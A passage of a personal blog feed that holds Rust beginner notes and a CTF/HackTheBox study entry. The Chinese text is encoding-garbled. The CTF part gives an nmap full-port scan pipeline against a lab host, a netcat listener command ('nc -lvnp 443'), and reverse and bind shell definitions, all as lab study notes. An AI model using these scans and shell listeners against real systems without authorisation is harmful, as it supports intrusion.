class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = build_user(</span><br><span class="line">        String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,  <span class="regexp">//</span>çœç•¥rather than <span class="symbol">email:</span> email.</span><br><span class="line">        username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ›´æ–°èµ‹äºˆå¦ä¸€å®ä¾‹</strong><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let user2 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"another@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"anotherusername567"</span>),</span><br><span class="line">        ..user1  /<span class="regexp">/ .. specifies that the remaining fields not explicitly set should have the same value as the fields in the given instance.</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="tuple-struct"><a href="#tuple-struct" class="headerlink" title="tuple struct"></a>tuple struct</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    struct Color(i32, i32, i32);</span><br><span class="line">    struct Point(i32, i32, i32);</span><br><span class="line"></span><br><span class="line">    let black = Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    let origin = Point(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åšç½‘ç«™<br>æ–‡ä»¶è·¯å¾„çš„ä¸€äº›é€šç”¨è§„åˆ™ï¼š</p><p>è‹¥å¼•ç”¨çš„ç›®æ ‡æ–‡ä»¶ä¸ HTML æ–‡ä»¶åŒçº§ï¼Œåªéœ€ç›´æ¥ä½¿ç”¨æ–‡ä»¶åï¼Œæ¯”å¦‚ <code>my-image.jpg</code>ã€‚<br>è¦å¼•ç”¨å­æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ï¼Œè¦åœ¨è·¯å¾„å‰å†™ä¸‹ç›®å½•åå¹¶åŠ ä¸€ä¸ªæ–œæ ï¼Œæ¯”å¦‚ <code>subdirectory/my-image.jpg</code>ã€‚<br>è‹¥å¼•ç”¨çš„ç›®æ ‡æ–‡ä»¶ä½äº HTML æ–‡ä»¶çš„ä¸Šçº§ï¼Œéœ€è¦åŠ ä¸Šä¸¤ä¸ªç‚¹ã€‚æ¯”å¦‚ï¼Œå¦‚æœ index.html åœ¨ test-site ä¸‹é¢çš„ä¸€ä¸ªå­ç›®å½•è€Œ my-image.png åœ¨ test-site ç›®å½•ï¼Œä½ å¯ä»¥åœ¨ index.html é‡Œä½¿ç”¨ <code>../my-image.png å¼•ç”¨ my-image.png</code>ã€‚<br>ä»¥ä¸Šæ–¹æ³•å¯ä»¥éšæ„ç»„åˆï¼Œæ¯”å¦‚ ../subdirectory/another-subdirectory/my-image.pngã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;rust&quot;&gt;&lt;a href=&quot;#rust&quot; class=&quot;headerlink&quot; title=&quot;rust&quot;&gt;&lt;/a&gt;rust&lt;/h3&gt;&lt;p&gt;All data &lt;code&gt;stored on the stack must have a known, fixed size.&lt;/code&gt;Data with an unknown size at compile time or a size that might change must be stored on the heap instead.&lt;/p&gt;
&lt;p&gt;Pushing to&lt;code&gt;the stack is faster than allocating on the heap&lt;/code&gt; because the allocator never has to search for a place to store new data;&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>RUSTå­¦ä¹ 1</title>
    <link href="http://finsenty54.github.io/2020/07/27/RUST%E5%AD%A6%E4%B9%A01/"/>
    <id>http://finsenty54.github.io/2020/07/27/RUSTå­¦ä¹ 1/</id>
    <published>2020-07-27T07:38:11.000Z</published>
    <updated>2020-07-27T07:50:07.327Z</updated>
    
    <content type="html"><![CDATA[<h3 id="è¿è¡Œå‘½ä»¤"><a href="#è¿è¡Œå‘½ä»¤" class="headerlink" title="è¿è¡Œå‘½ä»¤"></a>è¿è¡Œå‘½ä»¤</h3><p><code>cargo doc --open</code><br><code>rustup doc</code><br><code>cargo new --vcs=git</code><br><code>cargo build</code><br><code>cargo run</code><br><code>cargo check</code>æ›´å¿«ç¼–è¯‘ï¼Œä½†ä¸ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶<br><code>cargo build --release</code> ç”Ÿæˆçš„æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ›´å¿«<br>benchmarkåŸºå‡†æµ‹è¯•<br><a id="more"></a><br>Variables and Mutability<br>mutable æ˜“å˜çš„</p><p>let mut x=5</p><h6 id="rusté»˜è®¤å˜é‡ä¸å¯å˜"><a href="#rusté»˜è®¤å˜é‡ä¸å¯å˜" class="headerlink" title="rusté»˜è®¤å˜é‡ä¸å¯å˜"></a>rusté»˜è®¤å˜é‡ä¸å¯å˜</h6><p>fn main() {<br>const MAX_POINTS: u32 = 100_000;<br>}<br>const æ•´ä¸ªè¿è¡Œæ—¶é—´éƒ½å­˜åœ¨</p><p>fn main() {<br>    let spaces = â€œ   â€œ;<br>    let spaces = spaces.len();<br>}</p><h3 id="Data-Types"><a href="#Data-Types" class="headerlink" title="Data Types"></a>Data Types</h3><p>interger é»˜è®¤i32<br>float é»˜è®¤ f64<br>char â€˜â€™ 4å­—èŠ‚<em>Accented letters; Chinese, Japanese, and Korean characters; emoji; and zero-width spaces are all valid char values in Rust. </em><br>string â€œâ€</p><p>tuple å…ƒç»„ å›ºå®š ç±»å‹å¯ä»¥ä¸åŒ<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let tup: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let x: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let five_hundred = x<span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">    let six_point_four = x<span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line">    let one = x<span class="number">.2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>array æ•°ç»„ ç±»å‹ç›¸åŒ å›ºå®š å­˜åœ¨æ ˆä¸­<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> months = [<span class="string">"January"</span>, <span class="string">"February"</span>, <span class="string">"March"</span>, <span class="string">"April"</span>, <span class="string">"May"</span>, <span class="string">"June"</span>, <span class="string">"July"</span>,</span><br><span class="line">              <span class="string">"August"</span>, <span class="string">"September"</span>, <span class="string">"October"</span>, <span class="string">"November"</span>, <span class="string">"December"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a: [i32; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">3</span>; <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> first = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>rustä¼šæ£€æŸ¥ç´¢å¼•è·ƒå‡º</p><p>vector ä¸å›ºå®š</p><h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"Hello, world!"</span>);</span><br><span class="line"></span><br><span class="line">    another_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn another_function() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"Another function."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Rust<code>doesnâ€™t care</code>where you define your functions, only that theyâ€™re defined somewhere.</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    another_function(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn another_function(x: i32, y: i32) &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of y is: &#123;&#125;"</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿…é¡»å£°æ˜å‚æ•°ç±»å‹</p><hr><p><code>Statements</code>are instructions that perform some action and do not return a value.<br>let y = 6; æ— è¿”å›å€¼ä¸èƒ½èµ‹ç»™å…¶ä»–å˜é‡<br><code>Expressions</code> evaluate to a resulting value.</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> y = &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of y is: &#123;&#125;"</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Note the x + 1 line without a semicolon at the end, which is unlike most of the lines youâ€™ve seen so far. <strong>Expressions do not include ending semicolons.</strong> If you add a semicolon to the end of an expression, you turn it into a statement, which will then not return a value.</p><p>è¿”å›å€¼<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn five() -&gt; i32 &#123;</span><br><span class="line">    <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = five();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = plus_one(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn plus_one(x: i32) -&gt; i32 &#123;</span><br><span class="line">    x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h5><p>//</p><h3 id="control"><a href="#control" class="headerlink" title="control"></a>control</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number &lt; <span class="number">5</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"condition was true"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"condition was false"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Rust will <strong>not</strong> automatically try to <strong>convert non-Boolean types to a Boolean</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 4"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 3"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is divisible by 2"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"number is not divisible by 4, 3, or 2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> condition = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of number is: &#123;&#125;"</span>, number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h5><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    loop &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"again!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result = loop &#123;</span><br><span class="line">        counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The result is &#123;&#125;"</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="while"><a href="#while" class="headerlink" title="while"></a>while</h6><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> mut number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> number != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"&#123;&#125;!"</span>, number);</span><br><span class="line"></span><br><span class="line">        number -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"LIFTOFF!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="for"><a href="#for" class="headerlink" title="for"></a>for</h6><p> use a for loop and execute some code for each item in a collection<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> a.iter() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"the value is: &#123;&#125;"</span>, element);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">4</span>).rev() &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"&#123;&#125;!"</span>, number);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"LIFTOFF!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rev, to reverse the range</code></p><h3 id="guess-game-example"><a href="#guess-game-example" class="headerlink" title="guess game . example"></a>guess game . example</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println</span>!(<span class="string">"x = &#123;&#125; and y = &#123;&#125;"</span>, x, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cargo doc --open</code></p><p>The<strong> trim </strong>method on a String instance will eliminate any whitespace at the beginning and end<br>5\n å˜æˆ 5<br>The <strong>parse </strong>method on strings parses a string into some kind of number. </p><p>cargo fmt è‡ªåŠ¨è°ƒæ•´æ ¼å¼<br><a href="https://github.com/rust-lang/rustfmt" target="_blank" rel="noopener">https://github.com/rust-lang/rustfmt</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;è¿è¡Œå‘½ä»¤&quot;&gt;&lt;a href=&quot;#è¿è¡Œå‘½ä»¤&quot; class=&quot;headerlink&quot; title=&quot;è¿è¡Œå‘½ä»¤&quot;&gt;&lt;/a&gt;è¿è¡Œå‘½ä»¤&lt;/h3&gt;&lt;p&gt;&lt;code&gt;cargo doc --open&lt;/code&gt;&lt;br&gt;&lt;code&gt;rustup doc&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo new --vcs=git&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo build&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo run&lt;/code&gt;&lt;br&gt;&lt;code&gt;cargo check&lt;/code&gt;æ›´å¿«ç¼–è¯‘ï¼Œä½†ä¸ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶&lt;br&gt;&lt;code&gt;cargo build --release&lt;/code&gt; ç”Ÿæˆçš„æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ›´å¿«&lt;br&gt;benchmarkåŸºå‡†æµ‹è¯•&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>CTFå…¥é—¨ WECALL4+hackthebox-REVERSE</title>
    <link href="http://finsenty54.github.io/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/"/>
    <id>http://finsenty54.github.io/2020/07/11/CTFå…¥é—¨ WECALL4+hackthebox-REVERSE/</id>
    <published>2020-07-11T02:37:31.000Z</published>
    <updated>2020-07-11T02:40:05.281Z</updated>
    
    <content type="html"><![CDATA[<h4 id="wechall-register-globals"><a href="#wechall-register-globals" class="headerlink" title="wechall register_globals"></a>wechall register_globals</h4><p>register_globals åœ¨php 5.4.0 åè¢«ç§»é™¤ å…¶ä¼šè‡ªåŠ¨ç”Ÿæˆå„ç§å˜é‡ å¦‚htmlè¯·æ±‚å˜é‡<br><a href="http://1.1.1.1/report.asp?id=123&amp;kehu=222" target="_blank" rel="noopener">http://1.1.1.1/report.asp?id=123&amp;kehu=222</a><br>login[0]=admin ç›´æ¥login=admin åªå–ç¬¬ä¸€ç¬¬äºŒä¸ªå­—ç¬¦</p><hr><h4 id="hackthebox"><a href="#hackthebox" class="headerlink" title="hackthebox"></a>hackthebox</h4><p>invite challenge æµè§ˆå™¨console ä¸‹è¿è¡Œå‡½æ•° åŠ ï¼ˆï¼‰<br>curl -X POST https://â€¦</p><a id="more"></a><hr><h4 id="hackthebox-â€“-Enumeration"><a href="#hackthebox-â€“-Enumeration" class="headerlink" title="hackthebox â€“ Enumeration"></a>hackthebox â€“ Enumeration</h4><p>ports=$(nmap -p- â€“min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d â€˜/â€˜ -f 1 | tr â€˜\nâ€™ â€˜,â€™ | sed s/,$//)<br>nmap -sC -sV -p$ports 10.10.10.27</p><p>command 1 | command 2 æŠŠç¬¬ä¸€ä¸ªå‘½ä»¤command 1æ‰§è¡Œçš„ç»“æœä½œä¸ºcommand 2çš„è¾“å…¥ä¼ ç»™command 2<br>-T4 å¯ä»¥åŠ å¿«æ‰§è¡Œé€Ÿåº¦<br>-p- æ‰«ææ‰€æœ‰ç«¯å£<br>-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcut<br>cut Print selected parts of lines from each FILE to standard output.<br>-f æŒ‡å®šç¬¬ä¸€åˆ— -d æŒ‡å®šåˆ—åˆ†éš”ç¬¦<br> tr å‘½ä»¤ç”¨äºè½¬æ¢æˆ–åˆ é™¤æ–‡ä»¶ä¸­çš„å­—ç¬¦ â€˜\nâ€™ è½¬æ¢ä¸ºâ€˜ï¼Œâ€™<br>sed â€˜s/regexp/replacement/flagsâ€™.<br>Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.<br>regexpåŒ¹é…æˆåŠŸåç”¨replaceæ›¿ä»£</p><p>select IS_SRVROLEMEMBER (â€˜sysadminâ€™)</p><hr><p>remote code execution (RCE)</p><h4 id="A-reverse-shell"><a href="#A-reverse-shell" class="headerlink" title="A reverse shell"></a>A reverse shell</h4><p>is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.</p><h4 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h4><p>Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machineâ€™s listener which then leads to code or command execution on the server.</p><hr><p>netcat<br>nc -lvnp 443 ç›‘å¬æ¨¡å¼ 443 å¤–æ¥è¯·æ±‚</p><hr><h4 id="ollydbg"><a href="#ollydbg" class="headerlink" title="ollydbg"></a>ollydbg</h4><p>æ˜¾ç¤ºå½“å‰EIP *<br>æ‰§è¡Œåˆ°å…‰æ ‡ä½ç½® F4<br>F2 æ–­ç‚¹<br>CALL æŠŠæ¥ä¸‹æ¥çš„åœ°å€å…ˆå‹å…¥æ ˆ<br>win å‹å…¥å‚æ•°é€†åº f(a,b) å…ˆå‹b å a<br>test = and ä¸æ”¹å˜æ“ä½œæ•°å€¼</p><h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h4><p>file test.py</p>]]></content>
    
    <summary type="html">
    
